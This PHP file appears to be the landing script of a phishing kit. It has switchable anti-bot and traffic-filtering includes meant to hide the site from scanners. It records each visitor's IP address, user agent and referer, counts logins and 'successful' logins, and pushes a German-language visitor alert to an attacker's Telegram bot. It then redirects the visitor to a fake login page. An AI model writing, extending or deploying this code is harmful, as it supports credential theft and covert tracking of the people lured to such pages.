<?php
session_start();

// Include Telegram configuration
include './config/telegram.php';

// Bypass anti-bot protection for local testing
$bypass_antibot = true;

if (!$bypass_antibot) {
    include './antibot.php';
    include './antibot/tds.php';
    include './prevents/genius.php';
    include './antibot/tds.php';
    include './prevents/anti.php';
    include './prevents/anti2.php';
    include './prevents/sub_anti.php';
    include './prevents/block.php';
}

// Get visitor information
$ip = $_SERVER['REMOTE_ADDR'];
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$time = date('Y-m-d H:i:s');

// Log visitor data
$log_data = [
    'timestamp' => $time,
    'ip' => $ip,
    'user_agent' => $user_agent,
    'referer' => $referer
];

// Save to log file
$log_file = './logs/visitors.log';
$log_entry = json_encode($log_data) . "\n";
file_put_contents($log_file, $log_entry, FILE_APPEND | LOCK_EX);

// Update stats
$stats_file = './app/Panel/stats/stats.ini';
$stats = @parse_ini_file($stats_file);
if (!$stats) {
    $stats = ['visitors' => 0, 'bots' => 0, 'logins' => 0, 'successful_logins' => 0];
}
$stats['visitors']++;
file_put_contents($stats_file, "[stats]\nvisitors = {$stats['visitors']}\nbots = {$stats['bots']}\nlogins = {$stats['logins']}\nsuccessful_logins = {$stats['successful_logins']}\n");

// Telegram Bot 1 - Visitor notification
if ($enable_telegram) {
    $message = "🔔 <b>Neuer Besucher auf der Homepage</b>\n\n";
    $message .= "🌐 <b>IP:</b> $ip\n";
    $message .= "🕒 <b>Zeit:</b> $time\n";
    $message .= "🌍 <b>User Agent:</b> $user_agent\n";
    if ($referer) {
        $message .= "🔗 <b>Referer:</b> $referer\n";
    }
    
    sendTelegramMessage($telegram_bot1_token, $telegram_bot1_chat_id, $message);
}

// Redirect to login page
header("Location: ./views/loginz.php");
exit;
?>
